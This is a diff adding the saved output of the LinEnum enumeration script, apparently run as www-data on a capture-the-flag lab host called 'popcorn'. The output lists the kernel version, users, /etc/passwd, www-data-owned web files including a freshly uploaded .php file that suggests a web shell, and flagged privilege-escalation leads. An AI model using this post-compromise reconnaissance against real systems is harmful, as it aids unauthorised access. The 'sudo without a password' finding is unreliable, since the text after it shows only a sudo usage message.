@@ -1,0 +1,1966 @@
+
+[00;31m#########################################################[00m
+[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
+[00;31m#########################################################[00m
+[00;33m# www.rebootuser.com[00m
+[00;33m# version 0.982[00m
+
+[-] Debug Info
+[+] Report name = popcorn-26-02-22
+[+] Thorough tests = Enabled
+
+
+[00;33mScan started at:
+Sat Feb 26 03:04:07 EET 2022
+[00m
+
+[00;33m### SYSTEM ##############################################[00m
+[00;31m[-] Kernel information:[00m
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+
+
+[00;31m[-] Kernel information (continued):[00m
+Linux version 2.6.31-14-generic-pae (buildd@rothera) (gcc version 4.4.1 (Ubuntu 4.4.1-4ubuntu8) ) #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009
+
+
+[00;31m[-] Specific release information:[00m
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=9.10
+DISTRIB_CODENAME=karmic
+DISTRIB_DESCRIPTION="Ubuntu 9.10"
+
+
+[00;31m[-] Hostname:[00m
+popcorn
+
+
+[00;33m### USER/GROUP ##########################################[00m
+[00;31m[-] Current user/group info:[00m
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+[00;31m[-] Users that have previously logged onto the system:[00m
+Username         Port     From             Latest
+root             tty1                      Tue Oct 27 11:08:55 +0200 2020
+george           tty1                      Fri May  5 23:12:20 +0300 2017
+
+
+[00;31m[-] Who else is logged on:[00m
+ 03:04:07 up 44 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[00;31m[-] Group memberships:[00m
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
+uid=101(syslog) gid=103(syslog) groups=103(syslog)
+uid=102(landscape) gid=105(landscape) groups=105(landscape)
+uid=103(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(george) gid=1000(george) groups=1000(george),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin)
+uid=104(mysql) gid=113(mysql) groups=113(mysql)
+
+
+[00;31m[-] It looks like we have some admin users:[00m
+uid=1000(george) gid=1000(george) groups=1000(george),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin)
+
+
+[00;31m[-] Contents of /etc/passwd:[00m
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+landscape:x:102:105::/var/lib/landscape:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
+mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
+
+
+[00;31m[-] Super user account(s):[00m
+root
+
+
+[00;33m[+] We can sudo without supplying a password![00m
+usage: sudo [-n] -h | -K | -k | -L | -V | -v
+usage: sudo -l[l] [-AnS] [-g groupname|#gid] [-U username] [-u username|#uid]
+            [-g groupname|#gid] [command]
+usage: sudo [-AbEHnPS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
+            username|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AnS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
+            username|#uid] file ...
+
+
+[00;33m[+] Possible sudo pwnage![00m
+file
+
+
+[00;31m[-] Accounts that have recently used sudo:[00m
+/home/george/.sudo_as_admin_successful
+
+
+[00;31m[-] Are permissions on /home directories lax:[00m
+total 12K
+drwxr-xr-x  3 root   root   4.0K Mar 17  2017 .
+drwxr-xr-x 21 root   root   4.0K Feb 26 02:19 ..
+drwxr-xr-x  3 george george 4.0K Oct 26  2020 george
+
+
+[00;31m[-] Files not owned by user but writable by group:[00m
+-rw-rw-rw- 1 root root 165 Feb 26 02:19 /var/run/motd
+
+
+[00;31m[-] Files owned by our user:[00m
+-rw-r--r-- 1 www-data www-data 247 Mar 17  2017 /var/www/rename/index.php
+-rw-r--r-- 1 www-data www-data 21 Mar 17  2017 /var/www/test.php
+-rw-r--r-- 1 www-data www-data 6683 Apr 11  2017 /var/www/torrent/config.php
+-rw-r--r-- 1 www-data www-data 1467 Jun  3  2007 /var/www/torrent/upload_file.php
+-rw-r--r-- 1 www-data www-data 4190 Dec 28  2006 /var/www/torrent/thumbnail.php
+-rw-r--r-- 1 www-data www-data 329 Dec 28  2006 /var/www/torrent/logout.php
+-rw-r--r-- 1 www-data www-data 3948 Mar  6  2005 /var/www/torrent/lib/dblib.php
+-rw-r--r-- 1 www-data www-data 6294 Mar 12  2005 /var/www/torrent/lib/stdlib.php
+-rw-r--r-- 1 www-data www-data 9020 Jun  3  2007 /var/www/torrent/lib/webtorrent.php
+-rw-r--r-- 1 www-data www-data 5065 Mar  6  2005 /var/www/torrent/lib/BDecode.php
+-rw-r--r-- 1 www-data www-data 2398 Mar  6  2005 /var/www/torrent/lib/BEncode.php
+-rw-r--r-- 1 www-data www-data 2511 Jun  2  2007 /var/www/torrent/lib/getscrape.php
+-rw-r--r-- 1 www-data www-data 7221 Jun  3  2007 /var/www/torrent/torrents.php
+-rw-r--r-- 1 www-data www-data 2054 Apr  4  2006 /var/www/torrent/css/lightbox.css
+-rw-r--r-- 1 www-data www-data 3099 Mar  6  2005 /var/www/torrent/admin/siteUpdate.php
+-rw-r--r-- 1 www-data www-data 4744 Mar 11  2005 /var/www/torrent/admin/users.php
+-rw-r--r-- 1 www-data www-data 1780 Jun  3  2007 /var/www/torrent/admin/images/browse.jpg
+-rw-r--r-- 1 www-data www-data 2155 Jun  3  2007 /var/www/torrent/admin/images/add news.jpg
+-rw-r--r-- 1 www-data www-data 2339 Jun  3  2007 /var/www/torrent/admin/images/edit news.jpg
+-rw-r--r-- 1 www-data www-data 2746 Jan  4  2007 /var/www/torrent/admin/images/users.png
+-rw-r--r-- 1 www-data www-data 2398 Jun  3  2007 /var/www/torrent/admin/images/list torrents.jpg
+-rw-r--r-- 1 www-data www-data 1077 Jun  3  2007 /var/www/torrent/admin/images/news management.gif
+-rw-r--r-- 1 www-data www-data 2792 Jun  3  2007 /var/www/torrent/admin/images/dead torrents.jpg
+-rw-r--r-- 1 www-data www-data 1034 Jun  3  2007 /var/www/torrent/admin/images/files management.gif
+-rw-r--r-- 1 www-data www-data 2325 Jan  4  2007 /var/www/torrent/admin/images/logout.png
+-rw-r--r-- 1 www-data www-data 1897 Jun  3  2007 /var/www/torrent/admin/images/users.jpg
+-rw-r--r-- 1 www-data www-data 2661 Jun  3  2007 /var/www/torrent/admin/images/add categories.jpg
+-rw-r--r-- 1 www-data www-data 2483 Jun  3  2007 /var/www/torrent/admin/images/list categories.jpg
+-rw-r--r-- 1 www-data www-data 1657 Jun  3  2007 /var/www/torrent/admin/images/ban users.jpg
+-rw-r--r-- 1 www-data www-data 1933 Jun  3  2007 /var/www/torrent/admin/images/hack.jpg
+-rw-r--r-- 1 www-data www-data 1057 Jun  3  2007 /var/www/torrent/admin/images/users management.gif
+-rw-r--r-- 1 www-data www-data 1876 Jun  3  2007 /var/www/torrent/admin/images/add subcategories.jpg
+-rw-r--r-- 1 www-data www-data 2450 Jun  3  2007 /var/www/torrent/admin/images/comments.jpg
+-rw-r--r-- 1 www-data www-data 6252 Mar  6  2005 /var/www/torrent/admin/orderusers.js
+-rw-r--r-- 1 www-data www-data 406 Mar  6  2005 /var/www/torrent/admin/emailUsers.php
+-rw-r--r-- 1 www-data www-data 3008 Jun  3  2007 /var/www/torrent/admin/admin.php
+-rw-r--r-- 1 www-data www-data 14440 Jun  3  2007 /var/www/torrent/admin/index.php
+-rw-r--r-- 1 www-data www-data 495 Mar 23  2005 /var/www/torrent/admin/templates/insert_news.php
+-rw-r--r-- 1 www-data www-data 515 Nov 30  2006 /var/www/torrent/admin/templates/ban_list.php
+-rw-r--r-- 1 www-data www-data 887 Jun  3  2007 /var/www/torrent/admin/templates/footer.php
+-rw-r--r-- 1 www-data www-data 1045 Jun  3  2007 /var/www/torrent/admin/templates/torrents_list.php
+-rw-r--r-- 1 www-data www-data 289 Mar 11  2005 /var/www/torrent/admin/templates/subcategories.php
+-rw-r--r-- 1 www-data www-data 509 Jan  3  2007 /var/www/torrent/admin/templates/hack_list.php
+-rw-r--r-- 1 www-data www-data 779 Dec 26  2006 /var/www/torrent/admin/templates/admin.php
+-rw-r--r-- 1 www-data www-data 1012 Jan  8  2007 /var/www/torrent/admin/templates/list_cat.php
+-rw-r--r-- 1 www-data www-data 517 Mar 23  2005 /var/www/torrent/admin/templates/news.php
+-rw-r--r-- 1 www-data www-data 1175 Mar  9  2005 /var/www/torrent/admin/templates/torrent_details.php
+-rw-r--r-- 1 www-data www-data 1034 Nov 29  2006 /var/www/torrent/admin/templates/torrents_list_date.php
+-rw-r--r-- 1 www-data www-data 819 Jan 11  2007 /var/www/torrent/admin/templates/list_users.php
+-rw-r--r-- 1 www-data www-data 852 Mar 23  2005 /var/www/torrent/admin/templates/edit_news.php
+-rw-r--r-- 1 www-data www-data 524 Jan  8  2007 /var/www/torrent/admin/templates/add_cat.php
+-rw-r--r-- 1 www-data www-data 770 Jan  5  2007 /var/www/torrent/admin/templates/add_subcat.php
+-rw-r--r-- 1 www-data www-data 808 Jan  3  2007 /var/www/torrent/admin/templates/comments_list.php
+-rw-r--r-- 1 www-data www-data 8243 Jun  3  2007 /var/www/torrent/admin/templates/header.php
+-rw-r--r-- 1 www-data www-data 10909 Jan  8  2007 /var/www/torrent/admin/templates/modify.php
+-rw-r--r-- 1 www-data www-data 1796 Mar 12  2005 /var/www/torrent/admin/templates/login_form2.php
+-rw-r--r-- 1 www-data www-data 3151 Nov 29  2006 /var/www/torrent/admin/uda.php
+-rw-r--r-- 1 www-data www-data 434 Mar  6  2005 /var/www/torrent/admin/messageBoard.php
+-rw-r--r-- 1 www-data www-data 47603 Mar 10  2006 /var/www/torrent/js/prototype.js
+-rw-r--r-- 1 www-data www-data 2152 Jan 25  2006 /var/www/torrent/js/scriptaculous.js
+-rw-r--r-- 1 www-data www-data 20711 Dec 28  2006 /var/www/torrent/js/lightbox.js
+-rw-r--r-- 1 www-data www-data 31969 Jan 25  2006 /var/www/torrent/js/effects.js
+-rw-r--r-- 1 www-data www-data 3042 Jun  3  2007 /var/www/torrent/comment.php
+-rw-r--r-- 1 www-data www-data 1612 Jun  3  2007 /var/www/torrent/edit.php
+-rw-r--r-- 1 www-data www-data 2353 May 31  2007 /var/www/torrent/images/link-home.png
+-rw-r--r-- 1 www-data www-data 1524 May 31  2007 /var/www/torrent/images/search.jpg
+-rw-r--r-- 1 www-data www-data 75 Jan  1  2007 /var/www/torrent/images/sidebarspace.gif
+-rw-r--r-- 1 www-data www-data 363 Jun  1  2007 /var/www/torrent/images/orange bg.jpg
+-rw-r--r-- 1 www-data www-data 2317 May 31  2007 /var/www/torrent/images/link-browse.png
+-rw-r--r-- 1 www-data www-data 35325 May 31  2007 /var/www/torrent/images/updatestats.png
+-rw-r--r-- 1 www-data www-data 4242 Jun  1  2007 /var/www/torrent/images/link-about.png
+-rw-r--r-- 1 www-data www-data 2511 May 31  2007 /var/www/torrent/images/link-faq.png
+-rw-r--r-- 1 www-data www-data 35175 May 31  2007 /var/www/torrent/images/mytorrents.png
+-rw-r--r-- 1 www-data www-data 2283 May 31  2007 /var/www/torrent/images/link-upload.png
+-rw-r--r-- 1 www-data www-data 2305 Jun  1  2007 /var/www/torrent/images/link-development.png
+-rw-r--r-- 1 www-data www-data 2165 Jun  3  2007 /var/www/torrent/images/download details.jpg
+-rw-r--r-- 1 www-data www-data 1972 Jun  3  2007 /var/www/torrent/images/seeds.jpg
+-rw-r--r-- 1 www-data www-data 3725 Jun  3  2007 /var/www/torrent/images/register user.gif
+-rw-r--r-- 1 www-data www-data 62 Mar 12  2005 /var/www/torrent/images/regb.gif
+-rw-r--r-- 1 www-data www-data 12957 Jun  2  2007 /var/www/torrent/images/stats.png
+-rw-r--r-- 1 www-data www-data 1164 Jan  4  2007 /var/www/torrent/images/th.png
+-rw-r--r-- 1 www-data www-data 2767 Mar 27  2006 /var/www/torrent/images/loading.gif
+-rw-r--r-- 1 www-data www-data 579 Jan 23  2007 /var/www/torrent/images/leftcor.png
+-rw-r--r-- 1 www-data www-data 2723 Jun  2  2007 /var/www/torrent/images/green mark.jpg
+-rw-r--r-- 1 www-data www-data 2958 May 31  2007 /var/www/torrent/images/link-news.png
+-rw-r--r-- 1 www-data www-data 1084 Jan  5  2007 /var/www/torrent/images/folder2.png
+-rw-r--r-- 1 www-data www-data 33238 May 31  2007 /var/www/torrent/images/logout.png
+-rw-r--r-- 1 www-data www-data 13772 May 31  2007 /var/www/torrent/images/feed2.png
+-rw-r--r-- 1 www-data www-data 3131 Jun  3  2007 /var/www/torrent/images/statics.jpg
+-rw-r--r-- 1 www-data www-data 969 Jan  5  2007 /var/www/torrent/images/folder.png
+-rw-r--r-- 1 www-data www-data 925 Dec 31  2005 /var/www/torrent/images/details.png
+-rw-r--r-- 1 www-data www-data 3733 May 31  2007 /var/www/torrent/images/link-forum.png
+-rw-r--r-- 1 www-data www-data 415 Jan  1  2007 /var/www/torrent/images/login2.gif
+-rw-r--r-- 1 www-data www-data 32762 May 31  2007 /var/www/torrent/images/admin.png
+-rw-r--r-- 1 www-data www-data 1917 Jun  1  2007 /var/www/torrent/images/news-arrow.gif
+-rw-r--r-- 1 www-data www-data 30884 Jan  4  2007 /var/www/torrent/images/button.png
+-rw-r--r-- 1 www-data www-data 19213 Jun  1  2007 /var/www/torrent/images/banner.jpg
+-rw-r--r-- 1 www-data www-data 1385 Jun  2  2007 /var/www/torrent/images/back.gif
+-rw-r--r-- 1 www-data www-data 4663 May 31  2007 /var/www/torrent/images/logo.png
+-rw-r--r-- 1 www-data www-data 222 Mar 27  2006 /var/www/torrent/images/close.gif
+-rw-r--r-- 1 www-data www-data 379 May 31  2007 /var/www/torrent/images/top-bg.jpg
+-rw-r--r-- 1 www-data www-data 2986 Jun  3  2007 /var/www/torrent/images/edit.jpg
+-rw-r--r-- 1 www-data www-data 979 Apr  4  2006 /var/www/torrent/images/closelabel.gif
+-rw-r--r-- 1 www-data www-data 51 Mar 12  2005 /var/www/torrent/images/reg.gif
+-rw-r--r-- 1 www-data www-data 81 May 31  2007 /var/www/torrent/images/background.gif
+-rw-r--r-- 1 www-data www-data 3666 Jun  3  2007 /var/www/torrent/images/globe.jpg
+-rw-r--r-- 1 www-data www-data 31910 May 31  2007 /var/www/torrent/images/login.png
+-rw-r--r-- 1 www-data www-data 1081 Jun  1  2007 /var/www/torrent/images/download.png
+-rw-r--r-- 1 www-data www-data 2484 Jun  1  2007 /var/www/torrent/images/control panel.gif
+-rw-r--r-- 1 www-data www-data 917 Nov 30  2006 /var/www/torrent/images/feed.png
+-rw-r--r-- 1 www-data www-data 366 May 31  2007 /var/www/torrent/images/button-bg.jpg
+-rw-r--r-- 1 www-data www-data 43 Mar 27  2006 /var/www/torrent/images/blank.gif
+-rw-r--r-- 1 www-data www-data 480 Jan 22  2007 /var/www/torrent/images/page_bg.jpg
+-rw-r--r-- 1 www-data www-data 2214 May 31  2007 /var/www/torrent/images/login2.jpg
+-rw-r--r-- 1 www-data www-data 1446 Jan 22  2007 /var/www/torrent/images/rightcor.png
+-rw-r--r-- 1 www-data www-data 33698 May 31  2007 /var/www/torrent/images/register.png
+-rw-r--r-- 1 www-data www-data 2153 May 31  2007 /var/www/torrent/images/link-stats.png
+-rw-r--r-- 1 www-data www-data 2865 Jun  3  2007 /var/www/torrent/images/files screenshot.jpg
+-rw-r--r-- 1 www-data www-data 364 May 31  2007 /var/www/torrent/images/top-end.jpg
+-rw-r--r-- 1 www-data www-data 125 Jan  6  2007 /var/www/torrent/health/5.gif
+-rw-r--r-- 1 www-data www-data 112 Jan  6  2007 /var/www/torrent/health/2.gif
+-rw-r--r-- 1 www-data www-data 118 Jan  6  2007 /var/www/torrent/health/3.gif
+-rw-r--r-- 1 www-data www-data 106 Jan  6  2007 /var/www/torrent/health/1.gif
+-rw-r--r-- 1 www-data www-data 120 Jan  6  2007 /var/www/torrent/health/4.gif
+-rw-r--r-- 1 www-data www-data 3307 Jun 10  2005 /var/www/torrent/rss.php
+-rw-r--r-- 1 www-data www-data 15087 Mar 17  2017 /var/www/torrent/upload.php
+-rw-r--r-- 1 www-data www-data 1604 Jun  3  2007 /var/www/torrent/index.php
+-rw-r--r-- 1 www-data www-data 6257 Mar  6  2005 /var/www/torrent/sorttable.js
+-rw-r--r-- 1 www-data www-data 1667 Jun  2  2007 /var/www/torrent/templates/login_form.php
+-rw-r--r-- 1 www-data www-data 5205 Jun  3  2007 /var/www/torrent/templates/layout.css
+-rw-r--r-- 1 www-data www-data 320 Mar 12  2005 /var/www/torrent/templates/form_header.php
+-rw-r--r-- 1 www-data www-data 901 Jun  3  2007 /var/www/torrent/templates/footer.php
+-rw-r--r-- 1 www-data www-data 850 Jun  3  2007 /var/www/torrent/templates/about.php
+-rw-r--r-- 1 www-data www-data 1720 Jun  1  2007 /var/www/torrent/templates/torrents_list.php
+-rw-r--r-- 1 www-data www-data 1324 Jun  2  2007 /var/www/torrent/templates/subcategories.php
+-rw-r--r-- 1 www-data www-data 2599 Jun  2  2007 /var/www/torrent/templates/colours.css
+-rw-r--r-- 1 www-data www-data 1098 Jan 25  2007 /var/www/torrent/templates/report_form.php
+-rw-r--r-- 1 www-data www-data 98 Nov 29  2006 /var/www/torrent/templates/insufficient_privileges.php
+-rw-r--r-- 1 www-data www-data 2337 Jun  2  2007 /var/www/torrent/templates/directory.php
+-rw-r--r-- 1 www-data www-data 120 Jan  3  2007 /var/www/torrent/templates/hack.php
+-rw-r--r-- 1 www-data www-data 415 Jun  2  2007 /var/www/torrent/templates/news.php
+-rw-r--r-- 1 www-data www-data 3952 Jun  3  2007 /var/www/torrent/templates/torrent_details.php
+-rw-r--r-- 1 www-data www-data 2131 Jun  3  2007 /var/www/torrent/templates/torrents_list_date.php
+-rw-r--r-- 1 www-data www-data 3745 Dec 26  2006 /var/www/torrent/templates/faq.php
+-rw-r--r-- 1 www-data www-data 765 Jun  2  2007 /var/www/torrent/templates/stats.php
+-rw-r--r-- 1 www-data www-data 272 Apr  9  2005 /var/www/torrent/templates/email/reset_password.php
+-rw-r--r-- 1 www-data www-data 693 Jun  1  2007 /var/www/torrent/templates/news2.php
+-rw-r--r-- 1 www-data www-data 8238 Jun  9  2007 /var/www/torrent/templates/header.php
+-rw-r--r-- 1 www-data www-data 12444 Jun  3  2007 /var/www/torrent/templates/modify.php
+-rw-r--r-- 1 www-data www-data 3548 Mar  6  2005 /var/www/torrent/validator.php
+-rw-r--r-- 1 www-data www-data 12333 Jan  6  2007 /var/www/torrent/readme/license.txt
+-rw-r--r-- 1 www-data www-data 3412 Jun  3  2007 /var/www/torrent/readme/readme.html
+-rw-r--r-- 1 www-data www-data 1825 Jan  9  2007 /var/www/torrent/login.php
+-rw-r--r-- 1 www-data www-data 1704 Jun  1  2007 /var/www/torrent/browse.php
+-rw-r--r-- 1 www-data www-data 986 Jun  3  2007 /var/www/torrent/update_stats2.php
+-rw-r--r-- 1 www-data www-data 539 Nov 30  2006 /var/www/torrent/update_stats.php
+-rw-r--r-- 1 www-data www-data 235216 Mar 17  2017 /var/www/torrent/torrents/723bc28f9b6f924cca68ccdff96b6190566ca6b4.btf
+-rw-r--r-- 1 www-data www-data 6 Mar  6  2005 /var/www/torrent/torrents/index.php
+-rw-r--r-- 1 www-data www-data 9813 Jun  3  2007 /var/www/torrent/database/th_database.sql
+-rw-r--r-- 1 www-data www-data 321 Nov 28  2006 /var/www/torrent/stylesheet.css
+-rw-r--r-- 1 www-data www-data 125 Jan 20  2007 /var/www/torrent/download.php
+-rw-r--r-- 1 www-data www-data 28104 Jan 27  2010 /var/www/torrent/preview.gif
+-rw-r--r-- 1 www-data www-data 3765 Mar  6  2005 /var/www/torrent/hide.js
+-rw-r--r-- 1 www-data www-data 32 Feb 26 02:55 /var/www/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php
+-rw-r--r-- 1 www-data www-data 2283 Feb 26 02:55 /var/www/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png
+-rw-r--r-- 1 www-data www-data 2484 Feb 26 02:52 /var/www/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.gif
+-rw-r--r-- 1 www-data www-data 33029 Jun  2  2007 /var/www/torrent/upload/noss.png
+-rw-r--r-- 1 www-data www-data 680 Mar  6  2005 /var/www/torrent/users/change_settings_form.php
+-rw-r--r-- 1 www-data www-data 2287 Jan 24  2007 /var/www/torrent/users/registration.php
+-rw-r--r-- 1 www-data www-data 1555 Mar 11  2005 /var/www/torrent/users/forgot_password.php
+-rw-r--r-- 1 www-data www-data 2204 Mar  6  2005 /var/www/torrent/users/change_password.php
+-rw-r--r-- 1 www-data www-data 6891 Jan 24  2007 /var/www/torrent/users/index.php
+-rw-r--r-- 1 www-data www-data 704 Jan 11  2007 /var/www/torrent/users/templates/registration_success.php
+-rw-r--r-- 1 www-data www-data 667 Mar  6  2005 /var/www/torrent/users/templates/change_settings_form.php
+-rw-r--r-- 1 www-data www-data 1431 Jun  3  2007 /var/www/torrent/users/templates/signup_form.php
+-rw-r--r-- 1 www-data www-data 1163 Mar 11  2005 /var/www/torrent/users/templates/forgot_password_form.php
+-rw-r--r-- 1 www-data www-data 690 Mar 12  2005 /var/www/torrent/users/templates/change_password_form.php
+-rw-r--r-- 1 www-data www-data 83 Mar 21  2005 /var/www/torrent/users/templates/users_menu.php
+-rw-r--r-- 1 www-data www-data 107 Mar  6  2005 /var/www/torrent/users/templates/forgot_password_success.php
+-rw-r--r-- 1 www-data www-data 11110 Mar  6  2005 /var/www/torrent/users/validation_class.php
+-rw-r--r-- 1 www-data www-data 701 Jul  7  2006 /var/www/torrent/users/img.jpg
+-rw-r--r-- 1 www-data www-data 1753 Mar  6  2005 /var/www/torrent/users/change_settings.php
+-rw-r--r-- 1 www-data www-data 822 Jul  7  2006 /var/www/torrent/users/php_captcha.php
+-rw-r--r-- 1 www-data www-data 573 Nov 29  2006 /var/www/torrent/secure.php
+-rw-r--r-- 1 www-data www-data 262205 May 31  2007 /var/www/torrent/PNG/banner.png
+-rw-r--r-- 1 www-data www-data 177 Mar 17  2017 /var/www/index.html
+-rwxr-xr-x 1 www-data www-data 46631 Feb 26 02:55 /tmp/LinEnum.sh
+-rw-r--r-- 1 www-data www-data 5129 Feb 26 03:04 /tmp/popcorn-26-02-22
+
+
+[00;31m[-] Hidden files:[00m
+-rw-rw-r-- 1 root src 957 Oct  1  2020 /srv/cvs/CVSROOT/.#postwatch
+-rw-rw-r-- 1 root src 4082 Oct  1  2020 /srv/cvs/CVSROOT/.#config
+-rw-rw-r-- 1 root src 876 Oct  1  2020 /srv/cvs/CVSROOT/.#notify
+-rw-rw-r-- 1 root src 495 Oct  1  2020 /srv/cvs/CVSROOT/.#checkoutlist
+-rw-rw-r-- 1 root src 1203 Oct  1  2020 /srv/cvs/CVSROOT/.#preproxy
+-rw-rw-r-- 1 root src 1105 Oct  1  2020 /srv/cvs/CVSROOT/.#postproxy
+-rw-rw-r-- 1 root src 649 Oct  1  2020 /srv/cvs/CVSROOT/.#rcsinfo
+-rw-rw-r-- 1 root src 1481 Oct  1  2020 /srv/cvs/CVSROOT/.#verifymsg
+-rw-rw-r-- 1 root src 1232 Oct  1  2020 /srv/cvs/CVSROOT/.#commitinfo
+-rw-rw-r-- 1 root src 1898 Oct  1  2020 /srv/cvs/CVSROOT/.#posttag
+-rw-rw-r-- 1 root src 602 Oct  1  2020 /srv/cvs/CVSROOT/.#cvswrappers
+-rw-rw-r-- 1 root src 1151 Oct  1  2020 /srv/cvs/CVSROOT/.#modules
+-rw-rw-r-- 1 root src 2255 Oct  1  2020 /srv/cvs/CVSROOT/.#taginfo
+-rw-rw-r-- 1 root src 922 Oct  1  2020 /srv/cvs/CVSROOT/.#postadmin
+-rw-rw-r-- 1 root src 1872 Oct  1  2020 /srv/cvs/CVSROOT/.#loginfo
+-rw-r--r-- 1 root root 0 Feb 26 02:19 /dev/.initramfs-tools
+-rw-r--r-- 1 root root 102 Sep 15  2009 /etc/cron.monthly/.placeholder
+-rw-r--r-- 1 root root 102 Sep 15  2009 /etc/cron.d/.placeholder
+-rw------- 1 root root 0 Mar 17  2017 /etc/.pwd.lock
+-rw-r--r-- 1 root root 24 Mar 17  2017 /etc/init.d/.depend.start
+-rw-r--r-- 1 root root 10 Mar 17  2017 /etc/init.d/.depend.stop
+-rw-r--r-- 1 root root 24 Mar 17  2017 /etc/init.d/.depend.boot
+-rw-r--r-- 1 root root 12288 Oct 14  2009 /etc/init.d/.umountroot.swp
+-rw-r--r-- 1 root root 0 Mar 17  2017 /etc/init.d/.legacy-bootordering
+-rw-r--r-- 1 root root 97 Mar 17  2017 /etc/apparmor.d/cache/.features
+-rw-r--r-- 1 root root 102 Sep 15  2009 /etc/cron.weekly/.placeholder
+-rw-r--r-- 1 root root 102 Sep 15  2009 /etc/cron.hourly/.placeholder
+-rw-r--r-- 1 root root 220 Sep 14  2009 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 3180 Sep 14  2009 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 675 Sep 14  2009 /etc/skel/.profile
+-rw-r--r-- 1 root root 102 Sep 15  2009 /etc/cron.daily/.placeholder
+-rw-r--r-- 1 george george 220 Mar 17  2017 /home/george/.bash_logout
+-rw-r--r-- 1 george george 3180 Mar 17  2017 /home/george/.bashrc
+-rw-r--r-- 1 george george 0 Mar 17  2017 /home/george/.sudo_as_admin_successful
+-rw------- 1 root root 19 May  5  2017 /home/george/.nano_history
+-rw------- 1 root root 1571 Mar 17  2017 /home/george/.mysql_history
+-rw-r--r-- 1 george george 675 Mar 17  2017 /home/george/.profile
+-rw-r--r-- 1 root root 74 Mar 17  2017 /usr/lib/pymodules/python2.6/.path
+-rw-r--r-- 1 root root 230 Oct 23  2009 /usr/share/doc/python-apt/html/.buildinfo
+-rw-r--r-- 1 root root 2 Apr  1  2009 /usr/share/python-support/python-gnupginterface/.version
+-rw-r--r-- 1 root root 401 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/.missing-syscalls.d
+-rw-r--r-- 1 root root 111417 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/.config
+-rw-r--r-- 1 root root 2785 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/basic/.fixdep.cmd
+-rw-r--r-- 1 root root 1515 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/basic/.hash.cmd
+-rw-r--r-- 1 root root 2391 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/basic/.docproc.cmd
+-rw-r--r-- 1 root root 1146 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/genksyms/.parse.o.cmd
+-rw-r--r-- 1 root root 2339 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/genksyms/.lex.o.cmd
+-rw-r--r-- 1 root root 1831 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/genksyms/.genksyms.o.cmd
+-rw-r--r-- 1 root root 145 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/genksyms/.genksyms.cmd
+-rw-r--r-- 1 root root 1516 Oct 16  2009 /usr/src/linux-headers-2.6.31-14-generic-pae/scripts/.kallsyms.cmd
